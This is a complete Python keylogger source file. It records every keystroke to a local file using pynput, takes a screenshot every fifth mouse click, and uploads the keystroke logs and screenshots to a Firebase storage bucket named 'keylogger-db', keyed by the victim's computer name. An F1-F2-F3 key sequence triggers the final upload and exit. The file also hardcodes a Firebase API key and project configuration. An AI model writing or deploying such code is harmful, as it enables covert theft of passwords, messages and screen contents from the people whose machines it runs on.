import os
from pynput import keyboard, mouse
from datetime import datetime as date
import pyrebase
import pyautogui

config = {
    'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
    'authDomain': "keylogger-db.firebaseapp.com",
    'databaseURL': "https://keylogger-db.firebaseio.com",
    'projectId': "keylogger-db",
    'storageBucket': "keylogger-db.appspot.com",
    'messagingSenderId': "282476825704",
    'appId': "1:282476825704:web:b9d206ed7519da3b7d3fdd",
    'measurementId': "G-TXMELPQRDB"
}
firebase = pyrebase.initialize_app(config)
storage = firebase.storage()

full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
today_date = full_currentTime.split(' ')[1]

f = open('data.txt', 'w', encoding='utf-8')

data = ''
lastThreeKeys = []
countDelete = 0
clicks_counter = 0


def on_press(key):
    global lastThreeKeys
    if len(lastThreeKeys) == 3:
        lastThreeKeys = lastThreeKeys[1:]
    lastThreeKeys.append(str(key))

    try:
        if lastThreeKeys == ['Key.f1', 'Key.f2', 'Key.f3']:
            f.close()

            storage.child(os.environ['COMPUTERNAME'] +
                          '/keylogs_' + today_date + '.txt') \
                .put('data.txt')

            # delete screenshot.jpg + data.txt
            os._exit(1)

        printKey(key)
    except:
        printKey(key)


def isValidLetter(key):
    return 'a' <= key <= 'z' or 'A' <= key <= 'Z' or key == '!' or key == '@' or key == '#' or key == '$' or \
           key == '%' or key == '^' or key == '&' or key == '*' or key == '(' or key == ')' \
           or key == '-' or key == '_' or key == '=' or key == '+' or key == '/' or key == '\\' or key == '`' \
           or key == '~' or key == '<' or key == '>' or key == '.' or key == ',' or key == ';' or key == ':' or key == '?' \
           or key == '[' or key == ']' or key == '{' or key == '}' or key == '"' or key == '\'' or key == '|' \
           or '1' <= key <= '9'


def printKey(key):
    global data, countDelete, f

    try:
        if str(key) == 'Key.enter':
            countDelete = 0
            data += '\n'
            print('\n')
            f.write('\n')

        elif str(key) == 'Key.backspace' and len(data) > 0:  # needs fixing !
            countDelete += 1
            if countDelete > 1:
                data = data[:-countDelete * 2 + 1] + str(data[-countDelete * 2 + 1] + '\u0336') \
                       + data[-countDelete * 2 + 2:]
            else:
                data = data[:-countDelete] + str(data[-countDelete] + '\u0336')
            f.close()
            f = open('data.txt', 'w', encoding='utf-8')
            f.write(data)

        elif str(key) == 'Key.space':
            countDelete = 0
            data += ' '
            print(' ')
            f.write(' ')

        elif str(key) == 'Key.tab':
            countDelete = 0
            data += '\t'
            print('\t')
            f.write('\t')

        elif hasattr(key, 'char'):
            countDelete = 0
            data += key.char
            print(key.char)
            f.write(key.char)

    except Exception as e:
        print(e)


def on_click(x, y, button, pressed):
    global clicks_counter

    clicks_counter += 1
    if clicks_counter == 5:
        # take screenshot and upload to firebase storage
        clicks_counter = 0

        myScreenshot = pyautogui.screenshot()
        myScreenshot.save('screenshot.jpg')

        storage.child(os.environ['COMPUTERNAME'] +
                      '/screenshot_' + full_currentTime + '.jpg') \
            .put('screenshot.jpg')


# Collect events of mouse clicks and keyboard keys
with keyboard.Listener(on_press=on_press) as k_listener, \
        mouse.Listener(on_click=on_click) as m_listener:
    k_listener.join()
    m_listener.join()
